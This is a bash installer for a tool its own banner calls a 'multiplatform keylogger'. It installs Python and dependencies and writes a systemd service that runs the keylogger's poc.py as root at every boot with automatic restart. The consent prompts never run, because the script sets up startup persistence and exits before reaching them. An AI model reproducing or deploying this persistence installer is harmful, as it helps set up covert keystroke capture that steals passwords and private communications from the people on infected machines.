#!/bin/bash

readonly MIN_PYV=2.7
readonly PSSCH_NAME="Pssch"
readonly PSSCH_VERSION="1.0.0"
readonly PSSCH_REPO="https://gitlab.com/gorkamu/pssch"
readonly PSSCH_SCRIPT_CURRENT_PATH=$PWD


greetings() {
  clear
  cat << "EOF"

 ____              __
|  __ \            | |
| |__) |__ ___  ___| |__
|  ___/ __/ __|/ __| '_ \
| |   \__ \__ \ (__| | | |
|_|   |___/___/\___|_| |_|

  MULTIPLATFORM KEYLOGGER

--------------------------
EOF
  echo "Name: $PSSCH_NAME"
  echo "Version: $PSSCH_VERSION"
  echo "Repository: $PSSCH_REPO"
  echo
  sleep 1
}

installRequirements() {
  PIP='pip install -r ./requirements.txt'
  eval $PIP
}

installPython () {
  mkdir -p ~/local
  wget http://www.python.org/ftp/python/2.7.3/Python-2.7.3.tgz
  tar xvzf Python-2.7.3.tgz
  cd Python-2.7.3
  ./configure
  make
  make altinstall prefix=~/local
  ln -s ~/local/bin/python2.7 ~/local/bin/python
  cd ..
}

installPip () {
  wget http://pypi.python.org/packages/source/s/setuptools/setuptools-0.6c11.tar.gz#md5=7df2a529a074f613b509fb44feefe74e
  tar xvzf setuptools-0.6c11.tar.gz
  cd setuptools-0.6c11
  ~/local/bin/python setup.py install  # specify the path to the python you installed above
  cd ..
  wget http://pypi.python.org/packages/source/p/pip/pip-1.2.1.tar.gz#md5=db8a6d8a4564d3dc7f337ebed67b1a85
  tar xvzf pip-1.2.1.tar.gz
  cd pip-1.2.1
  ~/local/bin/python setup.py install  # specify the path to the python you installed above
}

addToStartup() {
  cd /lib/systemd/system
  touch pssch.service
  FILE='/lib/systemd/system/pssch.service'
cat > $FILE <<- EOM
[Unit]
Description=pssch
After=network.target network-online.target

[Service]
Type=simple
User=root
Group=root
Restart=always
ExecStartPre=/bin/mkdir -p /run/pssch
PIDFile=/run/pssch/service.pid
ExecStart=/usr/bin/python $PSSCH_SCRIPT_CURRENT_PATH/poc.py

[Install]
WantedBy=multi-user.target
EOM

}

bye() {
  echo "...ok"
  sleep 2
  echo "Bye!"
  sleep 1
  exit
}

greetings
addToStartup
exit

echo "Checking dependencies..."
sleep 1
echo "Checking Python installation..."
sleep 1
if command -v python &>/dev/null; then
    echo "  Python is installed"
    sleep 1
    echo "Checking Python version"
    PYV=`python -c "import sys;t='{v[0]}.{v[1]}'.format(v=list(sys.version_info[:2]));sys.stdout.write(t)";`
    echo "  Python Version: $PYV"
    if (( $(echo "$PYV >= $MIN_PYV" |bc -l) )); then
      echo "Installing project dependencies..."
      sleep 1
      installRequirements
      echo "  Done"
      sleep 1
      read -r -p " Do you want to add it to the system startup? [y/n] " response
      case "$response" in
          [yY][eE][sS]|[yY])
            addToStartup
            bye;;
          *)
            bye;;
      esac
    else
      sleep 1
      echo "      Error: your Python version is lower than the minimun necessary ($MIN_PYV)"
      read -r -p "             Do you want to upgrade it? [y/n] " response
      case "$response" in
          [yY][eE][sS]|[yY])
            installPython
            installPip
            installRequirements
            bye;;
          *)
              bye;;
      esac
    fi
else
    echo "  Python is not installed"
    read -r -p "Do you want to install it? [y/n] " response
    case "$response" in
        [yY][eE][sS]|[yY])
          installPython
          installPip
          installRequirements
          bye;;
        *)
            bye;;
    esac
fi
